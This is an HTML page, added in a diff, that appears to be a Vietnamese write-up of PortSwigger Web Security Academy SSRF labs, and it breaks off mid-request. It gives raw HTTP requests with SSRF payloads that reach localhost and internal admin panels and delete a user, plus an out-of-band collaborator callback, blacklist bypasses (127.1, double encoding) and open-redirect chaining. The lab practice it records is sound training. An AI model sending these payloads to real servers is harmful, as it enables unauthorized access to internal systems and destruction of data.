@@ -1,0 +1,1705 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="My PortSwigger Web Security Academy writeups">
+      
+      
+        <meta name="author" content="Thanh Dat Hoang">
+      
+      
+        <link rel="canonical" href="https://hoangdat2407.github.io/myblog/Portswigger/SSRF/">
+      
+      
+        <link rel="prev" href="../SQL%20injection/">
+      
+      
+        <link rel="next" href="../Web%20cache%20poisoning/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>SSRF - PortSwigger Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#ssrf" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="PortSwigger Writeups" class="md-header__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            PortSwigger Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              SSRF
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="PortSwigger Writeups" class="md-nav__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    PortSwigger Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Server-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Server-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Access%20control%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Access Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Authentication%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Business%20logic%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../File%20upload%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../GraphQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GraphQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Information%20disclosure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Information Disclosure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20deserialize/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Insecure Deserialization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../JWT%20attack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JWT Attack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NoSQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NoSQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Oauth/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OAuth
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OS%20command%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OS Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Path%20traversal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Path Traversal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Prototype%20polution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prototype Pollution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Race%20condition/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Race Condition
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20side%20template%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20cache%20poisoning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Cache Poisoning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20socket/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WebSocket
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XML%20external%20entity%20%28XXE%29%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Client-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Client-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Clickjacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Clickjacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CORS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CORS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DOM-based%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DOM-based Vulnerabilities
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="ssrf">SSRF<a class="headerlink" href="#ssrf" title="Permanent link">&para;</a></h1>
+<h1 id="lab-basic-ssrf-against-the-local-server"><strong>Lab: Basic SSRF against the local server</strong><a class="headerlink" href="#lab-basic-ssrf-against-the-local-server" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost">Lab: Basic SSRF against the local server | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện chọn một sản phẩm. Kiểm tra số lượng sản phẩm còn trong kho</p>
+<p><img alt="image.png" src="image.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện nghiên cứu request gửi tới API <code>POST /product/stock</code> . Quan sát thấy cơ chế để lấy số lượng hàng tồn kho là gọi đến một url và response là số lượng. Nếu như thực hiện truy cập đến url dẫn tới <code>Admin panel</code> thì có thể sẽ có response trả về là panel của admin</p>
+<p><img alt="image.png" src="image%201.png" /></p>
+</li>
+<li>
+<p>Thực hiện gọi tới url của trang admin nhờ đường dẫn mà đề bài gợi ý. Chỉnh param <code>stockApi</code>  thành url dẫn tới admin panel</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code>POST /product/stock HTTP/2
+Host: 0a62004603849a4881388ff6008c00fd.web-security-academy.net
+Cookie: session=P3i2rZdFHtfCay2zN3p3SSoiQAtehF1G
+User-Agent: admin
+Accept: */*
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a62004603849a4881388ff6008c00fd.web-security-academy.net/product?productId=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 39
+Origin: https://0a62004603849a4881388ff6008c00fd.web-security-academy.net
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+stockApi=http%3a%2f%2flocalhost%2fadmin
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%202.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi tiếp url sau để xóa user <code>carlos</code> và hoàn thành giải lab</p>
+<ul>
+<li>
+<p>Đường dẫn để xóa user <code>carlos</code></p>
+<p><img alt="image.png" src="image%203.png" /></p>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code>POST /product/stock HTTP/2
+Host: 0a62004603849a4881388ff6008c00fd.web-security-academy.net
+Cookie: session=P3i2rZdFHtfCay2zN3p3SSoiQAtehF1G
+User-Agent: admin
+Accept: */*
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a62004603849a4881388ff6008c00fd.web-security-academy.net/product?productId=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Origin: https://0a62004603849a4881388ff6008c00fd.web-security-academy.net
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+stockApi=http%3a%2f%2flocalhost%2fadmin%2fdelete%3fusername%3dcarlos
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%204.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%205.png" /></p>
+</li>
+</ul>
+<h1 id="lab-basic-ssrf-against-another-back-end-system"><strong>Lab: Basic SSRF against another back-end system</strong><a class="headerlink" href="#lab-basic-ssrf-against-another-back-end-system" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system">Lab: Basic SSRF against another back-end system | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện chọn một sản phẩm. Kiểm tra số lượng sản phẩm còn trong kho</p>
+<p><img alt="image.png" src="image%206.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /product/stock</code> . Chuyển sang tab Repeater.</p>
+<div class="highlight"><pre><span></span><code>POST /product/stock HTTP/2
+Host: 0ac900670412e52680a6c1cd005600a3.web-security-academy.net
+Cookie: session=jYLGWMJ3WjStw1rXT2tjzyqx3sxkRmmj
+User-Agent: admin
+Accept: */*
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://0ac900670412e52680a6c1cd005600a3.web-security-academy.net/product?productId=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+Origin: https://0ac900670412e52680a6c1cd005600a3.web-security-academy.net
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+</code></pre></div>
+</li>
+<li>
+<p>Quan sát rằng, cơ chế lấy về số hàng tồn kho là gửi request đến 1 url. Nếu như url đó không tồn tại thì sẽ trả về 500</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%207.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện chuyển request trên sang tab Repeater và thực hiện tìm còn có ip nào hợp lệ không</p>
+<ul>
+<li>
+<p>Config Burp Intruder</p>
+<p><img alt="image.png" src="image%208.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Kết quả trả về có 1 url trả về 404</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%209.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện chuyển request có status code 404 ở bước trước sang tab Repeater. Tại đây, thực hiện thêm path <code>/admin</code> thì ra được <code>Admin panel</code></p>
+<p><img alt="image.png" src="image%2010.png" /></p>
+</li>
+<li>
+<p>Thực hiện gửi request tới url xóa <code>carlos</code> để xóa <code>carlos</code> . Xóa user thành công. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2011.png" /></p>
+<p><img alt="image.png" src="image%2012.png" /></p>
+</li>
+</ul>
+<h1 id="lab-blind-ssrf-with-out-of-band-detection"><strong>Lab: Blind SSRF with out-of-band detection</strong><a class="headerlink" href="#lab-blind-ssrf-with-out-of-band-detection" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection">Lab: Blind SSRF with out-of-band detection | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Truy cập vào một sản phẩm bất kỳ.</p>
+<p><img alt="image.png" src="image%2013.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện chỉnh sửa header <code>Referer</code>  của request gửi tới API <code>GET /product?productId=&lt;id&gt;</code> thành url mà ta kiểm soát. Cụ thể request như sau:</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code>GET /product?productId=1 HTTP/2
+Host: 0ac700130408a39c8070122d001d00d9.web-security-academy.net
+Cookie: session=n7fLfcBX7eYkHOwHaAWzn9g8cfem0bCm
+User-Agent: admin
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: http://lazq1u7nmtbeshgvnzzhdwjh88ez2pqe.oastify.com
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2014.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2015.png" /></p>
+</li>
+</ul>
+<h1 id="lab-ssrf-with-blacklist-based-input-filter"><strong>Lab: SSRF with blacklist-based input filter</strong><a class="headerlink" href="#lab-ssrf-with-blacklist-based-input-filter" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter">Lab: SSRF with blacklist-based input filter | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện truy cập vào một món hàng bất kỳ. Kiểm tra số lượng tồn kho món hàng đó</p>
+<p><img alt="image.png" src="image%2016.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /product/stock</code> chuyển sang tab Repeater. Tại đây, chúng ta quan sát được phía backend đã xử lý chặn khi chúng ta thay URL không hợp lệ vào param <code>stockApi</code></p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2017.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Chúng ta có thể sử dụng url khác là <code>127.1</code> và thành công request</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2018.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tại đây, thực hiện truy cập vào path <code>/admin</code> nhưng bị chặn</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2019.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tuy nhiên, khi thực hiện encode 2 lần thì thành công có thể là khi request gửi về thì được decode 1 lần và khi request nội bộ lại được decode lần nữa.</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2020.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện truy cập vào path xóa <code>carlos</code> . Hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC xóa <code>carlos</code></p>
+<p><img alt="image.png" src="image%2021.png" /></p>
+</li>
+<li>
+<p>POC hoàn thành lab</p>
+<p><img alt="image.png" src="image%2022.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-ssrf-with-filter-bypass-via-open-redirection-vulnerability"><strong>Lab: SSRF with filter bypass via open redirection vulnerability</strong><a class="headerlink" href="#lab-ssrf-with-filter-bypass-via-open-redirection-vulnerability" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection">Lab: SSRF with filter bypass via open redirection vulnerability | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện truy cập sản phẩm bất kỳ. Kiểm tra hàng tồn bằng chức năng <code>Check stock</code></p>
+<p><img alt="image.png" src="image%2023.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /product/stock</code> . Tại đây, chúng ta thấy có <code>stockApi</code> là path để kiểm tra số lượng và trả về kết quả của request nội bộ cho user → nếu request url nội bộ khác như trang admin thì cũng có thể xem được nội dung trang rồi</p>
+</li>
+<li>
+<p>Tuy nhiên, nếu dùng trực tiếp url <a href="http://192.168.0.12:8080/admin"><code>http://192.168.0.12:8080/admin</code></a> thì sẽ bị chặn vì không phải path hợp lệ</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2024.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Path hợp lệ sẽ có thể như này</p>
+<p><img alt="image.png" src="image%2025.png" /></p>
+</li>
+<li>
+<p>Ở trên web, có một chức năng open rediect dẫn người dùng đến trang khác khi thực hiện xem một sản phẩm và muốn xem thêm sản phẩm khác</p>
+<p><img alt="image.png" src="image%2026.png" /></p>
+</li>
+<li>
+<p>Thực hiện chức năng <code>Next product</code> . Trong phần mềm Burpsuite, bắt request gửi tới API <code>/product/nextProduct?currentProductId=1&amp;path=</code> và nhận thấy path để redirect không bị filter. Ngoài ra path này cũng khác giống path check stock → có thể không bị filter</p>
+<p><img alt="image.png" src="image%2027.png" /></p>
+</li>
+<li>
+<p>Chain 2 chức năng lại, ta có thể check stock 1 path redirect đến trang nội bộ và kết quả sẽ được trả về</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
